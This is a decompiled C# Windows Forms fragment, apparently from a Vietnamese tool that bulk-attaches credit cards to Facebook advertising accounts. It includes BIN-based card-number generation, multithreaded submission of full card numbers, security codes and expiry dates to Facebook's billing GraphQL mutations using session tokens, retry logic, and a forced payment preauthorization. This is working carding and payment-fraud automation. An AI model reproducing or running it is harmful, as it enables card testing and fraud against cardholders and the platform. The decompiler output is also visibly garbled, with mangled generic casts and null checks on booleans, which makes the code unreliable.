			while (true)
			{
				T2 val2 = (T2)((nint)val < listAct.Count);
				if (val2 == null)
				{
					break;
				}
				while (true)
				{
					T2 val3 = (T2)(isRunning && _003C_003Ec__DisplayClass13_.countThread >= intThread);
					if (val3 == null)
					{
						break;
					}
					Thread.Sleep(1500);
				}
				T2 val4 = (T2)(!isRunning);
				if (val4 != null)
				{
					break;
				}
				T1 val5 = (T1)new Thread(_003C_003Ec__DisplayClass13_._003Cstart_003Eb__0<T0, HttpRequest, T2, string, List<BinGenClass>.Enumerator, object, char, T4>);
				((Thread)val5).Start((object)val);
				T0 val6 = (T0)_003C_003Ec__DisplayClass13_.countThread;
				_003C_003Ec__DisplayClass13_.countThread = val6 + 1;
				val = (T0)(val + 1);
			}
			while (true)
			{
				T2 val7 = (T2)(isRunning && _003C_003Ec__DisplayClass13_.countThread > 0);
				if (val7 != null)
				{
					Thread.Sleep(1500);
					continue;
				}
				break;
			}
		}
		catch (Exception)
		{
			isRunning = false;
			btnStart.Text = "START";
			btnStart.BackColor = Color.Blue;
			frmMain.errorMessage("lỗi");
		}
		isRunning = false;
		btnStart.Text = "START";
		btnStart.BackColor = Color.Blue;
		frmMain.infoMessage("Done");
	}

	private void txtSucess_TextChanged<T0, T1, T2>(T1 sender, T2 e)
	{
		//IL_0036: Expected O, but got I4
		lbTotalSucess.Text = System.Runtime.CompilerServices.Unsafe.As<T0, int>(ref (T0)listAct.Where(_003C_003Ec._003C_003E9._003CtxtSucess_TextChanged_003Eb__16_0<bool>).Count()).ToString();
	}

	private void txtlỗi_TextChanged<T0, T1, T2>(T1 sender, T2 e)
	{
		//IL_0036: Expected O, but got I4
		lbTotallỗi.Text = System.Runtime.CompilerServices.Unsafe.As<T0, int>(ref (T0)listAct.Where(_003C_003Ec._003C_003E9._003Ctxtlỗi_TextChanged_003Eb__17_0<bool>).Count()).ToString();
	}

	private void frmAddCard_Load<T0, T1>(T0 sender, T1 e)
	{
		numThread.Value = frmMain.listFBEntity[indexEntity].numThread;
		txtBinGen.Text = frmMain.listFBEntity[indexEntity].txtBinGen;
		txtCountryCard.Text = frmMain.listFBEntity[indexEntity].txtCardCountry;
		cbAddBinGen.Checked = frmMain.listFBEntity[indexEntity].cbAddBinGen;
		loadCC<bool, int>();
	}

	private void frmAddCard_FormClosing<T0, T1, T2>(T1 sender, T2 e)
	{
		frmMain.listFBEntity[indexEntity].numThread = int.Parse(((decimal)(T0)numThread.Value).ToString());
		frmMain.listFBEntity[indexEntity].txtBinGen = txtBinGen.Text;
		frmMain.listFBEntity[indexEntity].txtCardCountry = txtCountryCard.Text;
		frmMain.listFBEntity[indexEntity].cbAddBinGen = cbAddBinGen.Checked;
	}

	private void numThread_ValueChanged<T0, T1, T2>(T1 sender, T2 e)
	{
		intThread = int.Parse(((decimal)(T0)numThread.Value).ToString());
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void txtBinGen_TextChanged<T0, T1, T2, T3, T4, T5>(T3 sender, T4 e)
	{
		//IL_0070: Expected O, but got I4
		//IL_0083: Expected O, but got I4
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Expected O, but got Unknown
		//IL_00d7: Expected O, but got I4
		T0 val = (T0)txtBinGen.Text.Replace("\r\n", ",").Replace("\n", ",").Replace("|", ",")
			.Replace(" ", "");
		listBinGen.Clear();
		T0[] array = (T0[])(object)((string)val).Split((char[])(object)new T5[1] { (T5)44 });
		T0[] array2 = array;
		T1 val2 = (T1)0;
		while ((nint)val2 < array2.Length)
		{
			T0 val3 = (T0)((object[])(object)array2)[(object)val2];
			T2 val4 = (T2)(!string.IsNullOrWhiteSpace((string)val3));
			if (val4 != null)
			{
				listBinGen.Add(new BinGenClass
				{
					Bin = ((string)val3).Trim(),
					Status = frmMain.STATUS.Ready.ToString()
				});
			}
			val2 = (T1)(val2 + 1);
		}
		lbTotalBinGen.Text = System.Runtime.CompilerServices.Unsafe.As<T1, int>(ref (T1)listBinGen.Count).ToString();
	}

	private void txtCountryCard_TextChanged<T0, T1>(T0 sender, T1 e)
	{
		CountryCard = txtCountryCard.Text;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public T2 addCart<T0, T1, T2, T3, T4>(T4 httpRequest, T0 Act, T0 country_code, T0 cardholder_name, T0 credit_card_number, T0 sensitive_string_value, T0 expiry_month, T0 expiry_year, out string outMessage)
	{
		//IL_0031: Expected O, but got I4
		//IL_0046: Expected O, but got I4
		//IL_0069: Expected O, but got I4
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_007a: Expected O, but got I4
		//IL_0230: Expected O, but got I4
		//IL_024b: Expected O, but got I4
		//IL_0279: Expected O, but got I4
		//IL_02a7: Expected O, but got I4
		//IL_02e2: Expected O, but got I4
		//IL_02f5: Expected O, but got I4
		outMessage = "Error";
		try
		{
			T0 val = (T0)((string)credit_card_number).Substring(0, 6);
			T0 val2 = (T0)((string)credit_card_number).Substring(((string)credit_card_number).Length - 4, 4);
			T2 val3 = (T2)(((string)expiry_year).Length == 2);
			if (val3 != null)
			{
				expiry_year = (T0)("20" + (string)expiry_year);
			}
			T1 val4 = (T1)0;
			T0 val6;
			while (true)
			{
				T0 str = (T0)string.Concat((string[])(object)new T0[21]
				{
					(T0)"{\"input\":{\"billing_address\":{\"country_code\":\"",
					country_code,
					(T0)"\"},\"billing_logging_data\":{\"logging_counter\":1,\"logging_id\":\"1\"},\"cardholder_name\":\"",
					cardholder_name,
					(T0)"\",\"credit_card_first_6\":{\"sensitive_string_value\":\"",
					val,
					(T0)"\"},\"credit_card_last_4\":{\"sensitive_string_value\":\"",
					val2,
					(T0)"\"},\"credit_card_number\":{\"sensitive_string_value\":\"",
					credit_card_number,
					(T0)"\"},\"csc\":{\"sensitive_string_value\":\"",
					sensitive_string_value,
					(T0)"\"},\"expiry_month\":\"",
					expiry_month,
					(T0)"\",\"expiry_year\":\"",
					expiry_year,
					(T0)"\",\"payment_account_id\":\"",
					Act,
					(T0)"\",\"payment_type\":\"MOR_ADS_INVOICE\",\"unified_payments_api\":true,\"actor_id\":\"",
					(T0)frmMain.listFBEntity[indexEntity].UID,
					(T0)"\",\"client_mutation_id\":\"3\"}}"
				});
				str = (T0)HttpUtility.UrlEncode((string)str);
				T0 val5 = (T0)string.Concat((string[])(object)new T0[9]
				{
					(T0)"av=",
					(T0)frmMain.listFBEntity[indexEntity].UID,
					(T0)"&payment_dev_cycle=prod&__usid=&__user=",
					(T0)frmMain.listFBEntity[indexEntity].UID,
					(T0)"&__a=1&__dyn=&__req=x&__hs=&dpr=1&__ccg=EXCELLENT&__rev=&__s=&__hsi=&__comet_req=0&fb_dtsg=",
					(T0)frmMain.listFBEntity[indexEntity].fb_dtsg,
					(T0)"&jazoest=&lsd=&__spin_r=&__spin_b=trunk&__spin_t=&__jssesw=1&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=useBillingAddCreditCardMutation&variables=",
					str,
					(T0)"&server_timestamps=true&doc_id=4126726757375265"
				});
				val6 = (T0)((object)((HttpRequest)httpRequest).Post(ResouceControl.getResouce("RESOUCE_API_PAYMENT") + "?tpe=%2Fapi%2Fgraphql%2F", string.Concat((string[])(object)new T0[1] { val5 }), "application/x-www-form-urlencoded")).ToString();
				T2 val7 = (T2)((string)val6).Contains((string)val2);
				if (val7 == null)
				{
					T2 val8 = (T2)(((string)val6).Contains("1383118") || ((string)val6).Contains("2078016"));
					if (val8 == null)
					{
						break;
					}
					val4 = (T1)(val4 + 1);
					T2 val9 = (T2)((nint)val4 < 3);
					if (val9 == null)
					{
						break;
					}
					approved_payment<T0, T2, T4>(httpRequest, Act);
					continue;
				}
				outMessage = "Sucess";
				approved_payment<T0, T2, T4>(httpRequest, Act);
				return (T2)1;
			}
			T2 val10 = (T2)((string)val6).Contains("description");
			if (val10 != null)
			{
				outMessage = Regex.Match((string)val6, "description\":\"(.*?)\",").Groups[1].Value;
			}
			T2 val11 = (T2)string.IsNullOrWhiteSpace(outMessage);
			if (val11 != null)
			{
				outMessage = Regex.Match((string)val6, "message\":\"(.*?)\",").Groups[1].Value;
			}
			T2 val12 = (T2)string.IsNullOrWhiteSpace(outMessage);
			if (val12 != null)
			{
				outMessage = Regex.Match((string)val6, "summary\":\"(.*?)\",").Groups[1].Value;
			}
		}
		catch (Exception ex)
		{
			outMessage = ex.Message;
		}
		return (T2)0;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public T1 approved_payment<T0, T1, T2>(T2 httpRequest, T0 Act)
	{
		//IL_0122: Expected O, but got I4
		//IL_0128: Expected O, but got I4
		//IL_0132: Expected O, but got I4
		try
		{
			T0 str = (T0)string.Concat((string[])(object)new T0[5]
			{
				(T0)"{\"input\":{\"billable_account_payment_legacy_account_id\":\"",
				Act,
				(T0)"\",\"entry_point\":\"BILLING_2_0\",\"actor_id\":\"",
				(T0)frmMain.listFBEntity[indexEntity].UID,
				(T0)"\",\"client_mutation_id\":\"1\"}}"
			});
			str = (T0)HttpUtility.UrlEncode((string)str);
			T0 val = (T0)string.Concat((string[])(object)new T0[9]
			{
				(T0)"av=",
				(T0)frmMain.listFBEntity[indexEntity].UID,
				(T0)"&__usid=&__user=",
				(T0)frmMain.listFBEntity[indexEntity].UID,
				(T0)"&__a=1&__dyn=&__csr=&__req=y&__hs=&dpr=1&__ccg=UNKNOWN&__rev=&__s=&__hsi=&__comet_req=1&fb_dtsg=",
				(T0)frmMain.listFBEntity[indexEntity].fb_dtsg,
				(T0)"&jazoest=&lsd=&__spin_r=&__spin_b=trunk&__spin_t=&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=useBillingPreauthPermitMutation&variables=",
				str,
				(T0)"&server_timestamps=true&doc_id=3514448948659909"
			});
			T0 val2 = (T0)((object)((HttpRequest)httpRequest).Post(ResouceControl.getResouce("RESOUCE_API_GRAPHQL"), string.Concat((string[])(object)new T0[1] { val }), "application/x-www-form-urlencoded")).ToString();
			T1 val3 = (T1)((string)val2).Contains("success\":true");
			if (val3 != null)
			{
				return (T1)1;
			}
		}
		catch
		{
		}
		return (T1)0;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void gvCard_MouseClick<T0, T1, T2, T3, T4>(T3 sender, T4 e)
	{
		//IL_000e: Expected O, but got I4
		T0 val = (T0)(((MouseEventArgs)e).Button == MouseButtons.Right);
		if (val != null)
		{
			T1 val2 = (T1)Activator.CreateInstance(typeof(ContextMenu));
			T2 item = (T2)new MenuItem("Paste Number|Exp_month|Exp_year|Security", (EventHandler)pasteCCEvent<T2, Thread, T0, T3, EventArgs>);
			((Menu)val2).MenuItems.Add((MenuItem)item);
			item = (T2)new MenuItem("Paste Number|Exp_month|Exp_year|Security x10", (EventHandler)pasteCCEvent<T2, Thread, T0, T3, EventArgs>);
			((Menu)val2).MenuItems.Add((MenuItem)item);
			T2 item2 = (T2)new MenuItem("Xóa toàn bộ", deleteAllCCEvent);
			((Menu)val2).MenuItems.Add((MenuItem)item2);
			((ContextMenu)val2).Show((Control)gvCard, new Point(((MouseEventArgs)e).X, ((MouseEventArgs)e).Y));
		}
	}

	private void deleteAllCCEvent<T0, T1>(T0 sender, T1 e)
	{
		frmMain.listFBEntity[indexEntity].listCard.Clear();
		loadCC<bool, int>();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void pasteCCEvent<T0, T1, T2, T3, T4>(T3 sender, T4 e)
	{
		//IL_002d: Expected O, but got I4
		_003C_003Ec__DisplayClass30_0 _003C_003Ec__DisplayClass30_ = new _003C_003Ec__DisplayClass30_0();
		_003C_003Ec__DisplayClass30_._003C_003E4__this = this;
		T0 val = (T0)((sender is T0) ? sender : null);
		_003C_003Ec__DisplayClass30_.isX10 = 1;
		T2 val2 = (T2)((MenuItem)val).Text.Equals("Paste Number|Exp_month|Exp_year|Security x10");
		if (val2 != null)
		{
			_003C_003Ec__DisplayClass30_.isX10 = 10;
		}
		T1 val3 = (T1)new Thread((ParameterizedThreadStart)_003C_003Ec__DisplayClass30_._003CpasteCCEvent_003Eb__0<string, T2, int, char, T3>);
		((Thread)val3).SetApartmentState(ApartmentState.STA);
		((Thread)val3).Start();
	}

	private void loadCC<T0, T1>()
	{
		//IL_0027: Expected O, but got I4
		//IL_007e: Expected O, but got I4
		//IL_0122: Expected O, but got I4
		T0 val = (T0)(frmMain.listFBEntity[indexEntity].listCard.Count <= 0);
		if (val == null)
		{
			T0 val2 = (T0)(string.IsNullOrWhiteSpace(frmMain.listFBEntity[indexEntity].listCard[0].Card_Number) && frmMain.listFBEntity[indexEntity].listCard.Count > 1);
			if (val2 != null)
			{
				frmMain.listFBEntity[indexEntity].listCard.RemoveAt(0);
			}
		}
		else
		{
			frmMain.listFBEntity[indexEntity].listCard.Add(new CreditCardEntity());
		}
		gvCard.DataSource = null;
		gvCard.DataSource = frmMain.listFBEntity[indexEntity].listCard;
		lbCard.Text = System.Runtime.CompilerServices.Unsafe.As<T1, int>(ref (T1)frmMain.listFBEntity[indexEntity].listCard.Count).ToString();
	}

	private void cbAddAllCard_CheckedChanged<T0, T1>(T0 sender, T1 e)
	{
		AddAllCard = cbAddAllCard.Checked;
	}

	private void cbAddBinGen_CheckedChanged<T0, T1>(T0 sender, T1 e)
	{
		AddBinGen = cbAddBinGen.Checked;
		txtBinGen.Enabled = cbAddBinGen.Checked;
		gvCard.Enabled = !cbAddBinGen.Checked;
	}

	private void cbAddCard_CheckedChanged<T0, T1, T2>(T1 sender, T2 e)
	{
		//IL_0018: Expected O, but got I4
		AddCard = cbAddCard.Checked;
		T0 val = (T0)AddCard;
		if (val != null)
		{
			cbAddCard.ForeColor = Color.Red;
		}
		else
		{
			cbAddCard.ForeColor = Color.Black;
		}
	}

	private void cbApprovedPayment_CheckedChanged<T0, T1, T2>(T1 sender, T2 e)
	{
		//IL_0018: Expected O, but got I4
		ApprovedPayment = cbApprovedPayment.Checked;
		T0 val = (T0)ApprovedPayment;
		if (val == null)
		{
			cbApprovedPayment.ForeColor = Color.Black;
		}
		else
		{
			cbApprovedPayment.ForeColor = Color.Red;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
	private void InitializeComponent<T0, T1, T2, T3, T4, T5, T6, T7, T8, T9, T10, T11, T12, T13, T14, T15, T16, T17, T18, T19, T20>()
	{
		T0 val = (T0)new System.ComponentModel.ComponentResourceManager(typeof(ADSPRoject.frmAddCard));
		this.lbStatus = (System.Windows.Forms.Label)System.Activator.CreateInstance(typeof(System.Windows.Forms.Label));
		this.txtBinGen = (System.Windows.Forms.TextBox)System.Activator.CreateInstance(typeof(System.Windows.Forms.TextBox));
		this.gvCard = (System.Windows.Forms.DataGridView)System.Activator.CreateInstance(typeof(System.Windows.Forms.DataGridView));
		this.splitContainer1 = (System.Windows.Forms.SplitContainer)System.Activator.CreateInstance(typeof(System.Windows.Forms.SplitContainer));
		this.lbTotalBinGen = (System.Windows.Forms.Label)System.Activator.CreateInstance(typeof(System.Windows.Forms.Label));
		this.cbAddBinGen = (System.Windows.Forms.CheckBox)System.Activator.CreateInstance(typeof(System.Windows.Forms.CheckBox));
		this.cbAddAllCard = (System.Windows.Forms.CheckBox)System.Activator.CreateInstance(typeof(System.Windows.Forms.CheckBox));
		this.lbCard = (System.Windows.Forms.Label)System.Activator.CreateInstance(typeof(System.Windows.Forms.Label));
		this.grouplỗi = (System.Windows.Forms.GroupBox)System.Activator.CreateInstance(typeof(System.Windows.Forms.GroupBox));
		this.lbTotallỗi = (System.Windows.Forms.Label)System.Activator.CreateInstance(typeof(System.Windows.Forms.Label));
		this.txtlỗi = (System.Windows.Forms.TextBox)System.Activator.CreateInstance(typeof(System.Windows.Forms.TextBox));
		this.groupDone = (System.Windows.Forms.GroupBox)System.Activator.CreateInstance(typeof(System.Windows.Forms.GroupBox));
		this.lbTotalSucess = (System.Windows.Forms.Label)System.Activator.CreateInstance(typeof(System.Windows.Forms.Label));
		this.txtSucess = (System.Windows.Forms.TextBox)System.Activator.CreateInstance(typeof(System.Windows.Forms.TextBox));
		this.groupTKQC = (System.Windows.Forms.GroupBox)System.Activator.CreateInstance(typeof(System.Windows.Forms.GroupBox));
		this.lbTotalAct = (System.Windows.Forms.Label)System.Activator.CreateInstance(typeof(System.Windows.Forms.Label));
		this.txtAct = (System.Windows.Forms.TextBox)System.Activator.CreateInstance(typeof(System.Windows.Forms.TextBox));
		this.btnStart = (System.Windows.Forms.Button)System.Activator.CreateInstance(typeof(System.Windows.Forms.Button));
		this.label1 = (System.Windows.Forms.Label)System.Activator.CreateInstance(typeof(System.Windows.Forms.Label));
		this.numThread = (System.Windows.Forms.NumericUpDown)System.Activator.CreateInstance(typeof(System.Windows.Forms.NumericUpDown));
		this.label2 = (System.Windows.Forms.Label)System.Activator.CreateInstance(typeof(System.Windows.Forms.Label));
		this.txtCountryCard = (System.Windows.Forms.TextBox)System.Activator.CreateInstance(typeof(System.Windows.Forms.TextBox));
		this.groupBox1 = (System.Windows.Forms.GroupBox)System.Activator.CreateInstance(typeof(System.Windows.Forms.GroupBox));
		this.label3 = (System.Windows.Forms.Label)System.Activator.CreateInstance(typeof(System.Windows.Forms.Label));
		this.txtLog = (System.Windows.Forms.TextBox)System.Activator.CreateInstance(typeof(System.Windows.Forms.TextBox));
		this.cbAddCard = (System.Windows.Forms.CheckBox)System.Activator.CreateInstance(typeof(System.Windows.Forms.CheckBox));
		this.cbApprovedPayment = (System.Windows.Forms.CheckBox)System.Activator.CreateInstance(typeof(System.Windows.Forms.CheckBox));
		((System.ComponentModel.ISupportInitialize)this.gvCard).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.splitContainer1).BeginInit();
		this.splitContainer1.Panel1.SuspendLayout();
		this.splitContainer1.Panel2.SuspendLayout();
		this.splitContainer1.SuspendLayout();
		this.grouplỗi.SuspendLayout();
		this.groupDone.SuspendLayout();
		this.groupTKQC.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numThread).BeginInit();
		this.groupBox1.SuspendLayout();
		base.SuspendLayout();
		this.lbStatus.AutoSize = true;
		this.lbStatus.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.lbStatus.ForeColor = System.Drawing.Color.Green;
		this.lbStatus.Location = new System.Drawing.Point(16, 11);
		this.lbStatus.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lbStatus.Name = "lbStatus";
		this.lbStatus.Size = new System.Drawing.Size(38, 17);
		this.lbStatus.TabIndex = 0;
		this.lbStatus.Text = "Live";
		this.txtBinGen.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtBinGen.Location = new System.Drawing.Point(132, 4);
		this.txtBinGen.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.txtBinGen.Multiline = true;
		this.txtBinGen.Name = "txtBinGen";
		this.txtBinGen.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.txtBinGen.Size = new System.Drawing.Size(320, 95);
		this.txtBinGen.TabIndex = 45;
		this.txtBinGen.TextChanged += new System.EventHandler(txtBinGen_TextChanged<T9, T10, T11, T12, T13, T14>);
		this.gvCard.AllowUserToAddRows = false;
		this.gvCard.AllowUserToDeleteRows = false;
		this.gvCard.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.gvCard.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.gvCard.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.gvCard.Location = new System.Drawing.Point(4, 135);
		this.gvCard.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.gvCard.Name = "gvCard";
		this.gvCard.RowHeadersWidth = 51;
		this.gvCard.Size = new System.Drawing.Size(449, 459);
		this.gvCard.TabIndex = 46;
		this.gvCard.MouseClick += new System.Windows.Forms.MouseEventHandler(gvCard_MouseClick<T11, T15, T16, T12, T17>);
		this.splitContainer1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.splitContainer1.Location = new System.Drawing.Point(7, 54);
		this.splitContainer1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.splitContainer1.Name = "splitContainer1";
		this.splitContainer1.Panel1.Controls.Add(this.lbTotalBinGen);
		this.splitContainer1.Panel1.Controls.Add(this.cbAddBinGen);
		this.splitContainer1.Panel1.Controls.Add(this.cbAddAllCard);
		this.splitContainer1.Panel1.Controls.Add(this.lbCard);
		this.splitContainer1.Panel1.Controls.Add(this.gvCard);
		this.splitContainer1.Panel1.Controls.Add(this.txtBinGen);
		this.splitContainer1.Panel2.Controls.Add(this.grouplỗi);
		this.splitContainer1.Panel2.Controls.Add(this.groupDone);
		this.splitContainer1.Panel2.Controls.Add(this.groupTKQC);
		this.splitContainer1.Size = new System.Drawing.Size(1197, 598);
		this.splitContainer1.SplitterDistance = 457;
		this.splitContainer1.SplitterWidth = 5;
		this.splitContainer1.TabIndex = 47;
		this.lbTotalBinGen.AutoSize = true;
		this.lbTotalBinGen.Location = new System.Drawing.Point(9, 31);
		this.lbTotalBinGen.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lbTotalBinGen.Name = "lbTotalBinGen";
		this.lbTotalBinGen.Size = new System.Drawing.Size(14, 16);
		this.lbTotalBinGen.TabIndex = 50;
		this.lbTotalBinGen.Text = "0";
		this.cbAddBinGen.AutoSize = true;
		this.cbAddBinGen.Location = new System.Drawing.Point(13, 6);
		this.cbAddBinGen.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.cbAddBinGen.Name = "cbAddBinGen";
		this.cbAddBinGen.Size = new System.Drawing.Size(101, 20);
		this.cbAddBinGen.TabIndex = 49;
		this.cbAddBinGen.Text = "Add bin gen";
		this.cbAddBinGen.UseVisualStyleBackColor = true;
		this.cbAddBinGen.CheckedChanged += new System.EventHandler(cbAddBinGen_CheckedChanged);
		this.cbAddAllCard.AutoSize = true;
		this.cbAddAllCard.Location = new System.Drawing.Point(132, 107);
		this.cbAddAllCard.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.cbAddAllCard.Name = "cbAddAllCard";
		this.cbAddAllCard.Size = new System.Drawing.Size(123, 20);
		this.cbAddAllCard.TabIndex = 48;
		this.cbAddAllCard.Text = "Add toàn bộ thẻ";
		this.cbAddAllCard.UseVisualStyleBackColor = true;
		this.cbAddAllCard.Visible = false;
		this.cbAddAllCard.CheckedChanged += new System.EventHandler(cbAddAllCard_CheckedChanged);
		this.lbCard.AutoSize = true;
		this.lbCard.Location = new System.Drawing.Point(9, 107);
		this.lbCard.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lbCard.Name = "lbCard";
		this.lbCard.Size = new System.Drawing.Size(14, 16);
		this.lbCard.TabIndex = 47;
		this.lbCard.Text = "0";
		this.grouplỗi.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.grouplỗi.Controls.Add(this.lbTotallỗi);
		this.grouplỗi.Controls.Add(this.txtlỗi);
		this.grouplỗi.Location = new System.Drawing.Point(4, 395);
		this.grouplỗi.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.grouplỗi.Name = "grouplỗi";
		this.grouplỗi.Padding = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.grouplỗi.Size = new System.Drawing.Size(727, 197);
		this.grouplỗi.TabIndex = 1;
		this.grouplỗi.TabStop = false;
		this.grouplỗi.Text = "Lỗi";
		this.lbTotallỗi.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		this.lbTotallỗi.AutoSize = true;
		this.lbTotallỗi.Location = new System.Drawing.Point(121, 0);
		this.lbTotallỗi.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lbTotallỗi.Name = "lbTotallỗi";
		this.lbTotallỗi.Size = new System.Drawing.Size(14, 16);
		this.lbTotallỗi.TabIndex = 2;
		this.lbTotallỗi.Text = "0";
		this.txtlỗi.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtlỗi.Location = new System.Drawing.Point(8, 23);
		this.txtlỗi.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.txtlỗi.Multiline = true;
		this.txtlỗi.Name = "txtlỗi";
		this.txtlỗi.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.txtlỗi.Size = new System.Drawing.Size(712, 165);
		this.txtlỗi.TabIndex = 0;
		this.txtlỗi.TextChanged += new System.EventHandler(txtlỗi_TextChanged<T10, T12, T13>);
		this.groupDone.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.groupDone.Controls.Add(this.lbTotalSucess);
		this.groupDone.Controls.Add(this.txtSucess);
		this.groupDone.Location = new System.Drawing.Point(4, 191);
		this.groupDone.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.groupDone.Name = "groupDone";
		this.groupDone.Padding = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.groupDone.Size = new System.Drawing.Size(727, 197);
		this.groupDone.TabIndex = 1;
		this.groupDone.TabStop = false;
		this.groupDone.Text = "Thành công";
		this.lbTotalSucess.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		this.lbTotalSucess.AutoSize = true;
		this.lbTotalSucess.Location = new System.Drawing.Point(121, 0);
		this.lbTotalSucess.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lbTotalSucess.Name = "lbTotalSucess";
		this.lbTotalSucess.Size = new System.Drawing.Size(14, 16);
		this.lbTotalSucess.TabIndex = 2;
		this.lbTotalSucess.Text = "0";
		this.txtSucess.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtSucess.Location = new System.Drawing.Point(8, 23);
		this.txtSucess.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.txtSucess.Multiline = true;
		this.txtSucess.Name = "txtSucess";
		this.txtSucess.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.txtSucess.Size = new System.Drawing.Size(712, 165);
		this.txtSucess.TabIndex = 0;
		this.txtSucess.TextChanged += new System.EventHandler(txtSucess_TextChanged<T10, T12, T13>);
		this.groupTKQC.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.groupTKQC.Controls.Add(this.lbTotalAct);
		this.groupTKQC.Controls.Add(this.txtAct);
		this.groupTKQC.Location = new System.Drawing.Point(4, 7);
		this.groupTKQC.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.groupTKQC.Name = "groupTKQC";
		this.groupTKQC.Padding = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.groupTKQC.Size = new System.Drawing.Size(727, 176);
		this.groupTKQC.TabIndex = 0;
		this.groupTKQC.TabStop = false;
		this.groupTKQC.Text = "TKQC";
		this.lbTotalAct.AutoSize = true;
		this.lbTotalAct.Location = new System.Drawing.Point(121, 0);
		this.lbTotalAct.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lbTotalAct.Name = "lbTotalAct";
		this.lbTotalAct.Size = new System.Drawing.Size(14, 16);
		this.lbTotalAct.TabIndex = 1;
		this.lbTotalAct.Text = "0";
		this.txtAct.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.txtAct.Location = new System.Drawing.Point(8, 23);
		this.txtAct.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.txtAct.Multiline = true;
		this.txtAct.Name = "txtAct";
		this.txtAct.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.txtAct.Size = new System.Drawing.Size(712, 144);
		this.txtAct.TabIndex = 0;
		this.txtAct.TextChanged += new System.EventHandler(txtAct_TextChanged<T9, T10, T11, T12, T13, T14>);
		this.btnStart.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.btnStart.BackColor = System.Drawing.Color.FromArgb(0, 0, 192);
		this.btnStart.ForeColor = System.Drawing.SystemColors.ControlLightLight;
		this.btnStart.Location = new System.Drawing.Point(1095, 5);
		this.btnStart.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
		this.btnStart.Name = "btnStart";
		this.btnStart.Size = new System.Drawing.Size(100, 42);
		this.btnStart.TabIndex = 48;
		this.btnStart.Text = "Start";
		this.btnStart.UseVisualStyleBackColor = false;
		this.btnStart.Click += new System.EventHandler(btnStart_Click<T11, T12, T13>);
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(660, 18);
